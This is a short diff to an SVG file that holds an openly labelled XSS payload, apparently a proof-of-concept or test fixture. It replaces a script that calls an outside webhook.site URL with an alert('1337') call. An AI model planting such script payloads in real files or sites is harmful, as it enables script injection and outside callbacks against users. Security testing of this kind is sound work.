@@ -7,9 +7,7 @@
 
     <!-- XSS Payload: Execute alert on load -->
     <script type="text/javascript">
-        fetch('https://webhook.site/ccfdba80-75e3-4a92-b762-35996707398d/', {
-			method: 'GET'
-		});
+        alert('1337');
     </script>
 </svg>
 
